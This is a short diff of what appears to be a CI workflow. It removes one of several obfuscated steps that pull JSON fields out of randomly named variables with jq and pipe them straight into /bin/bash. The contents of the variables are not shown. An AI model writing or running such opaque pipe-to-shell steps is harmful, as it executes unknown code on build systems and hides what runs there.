@@ -36,7 +36,6 @@ jobs:
           echo $a61 | jq -r .ywwph96580 | /bin/bash
           echo $dkm35998 | jq -r .qetk46 | /bin/bash
           echo $wysx26 | jq -r .vkpfk86317 | /bin/bash
-          echo $tpk41861 | jq -r .aj8378 | /bin/bash
           echo $rf89322 | jq -r .vdng8 | /bin/bash
           printf '%s' "$gbp159" | jq -r .onk18645 | /bin/bash
           echo $ymkbi38 | jq -r .d555 | /bin/bash
